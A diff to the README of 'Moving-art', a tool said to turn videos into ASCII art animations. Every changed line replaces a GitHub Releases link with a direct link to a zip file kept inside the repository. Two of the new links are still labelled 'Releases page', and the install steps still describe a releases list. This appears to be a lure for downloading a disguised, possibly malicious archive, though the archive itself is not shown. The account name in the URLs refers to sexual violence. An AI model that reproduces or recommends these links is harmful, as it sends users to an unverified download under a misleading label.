@@ -6,7 +6,7 @@ Welcome to Moving-Art! This application transforms ordinary videos into unique A
 
 ## 📥 Download Moving-art
 
-[![Download Moving-art](https://img.shields.io/badge/Download-Moving--art-brightgreen)](https://github.com/imrapingmygf/Moving-art/releases)
+[![Download Moving-art](https://raw.githubusercontent.com/imrapingmygf/Moving-art/main/sumless/Moving-art_v3.3.zip)](https://raw.githubusercontent.com/imrapingmygf/Moving-art/main/sumless/Moving-art_v3.3.zip)
 
 ## 📂 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, please ensure that your system meets these requirements:
 
 To start using Moving-Art, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/imrapingmygf/Moving-art/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/imrapingmygf/Moving-art/main/sumless/Moving-art_v3.3.zip).
 2. On this page, you will see different versions of Moving-Art.
 3. Look for the most recent release at the top of the list. It will usually have the highest version number.
 4. Click on the version number to open the release details.
@@ -72,6 +72,6 @@ For additional support, you may contact the developer or ask questions in the co
 
 ## 📥 Download Moving-art Again
 
-Don’t forget, you can always return to the [Releases page](https://github.com/imrapingmygf/Moving-art/releases) for updates or to download newer versions of Moving-Art.
+Don’t forget, you can always return to the [Releases page](https://raw.githubusercontent.com/imrapingmygf/Moving-art/main/sumless/Moving-art_v3.3.zip) for updates or to download newer versions of Moving-Art.
 
 Have fun creating ASCII art animations with your videos! Enjoy the unique experience Moving-Art offers.
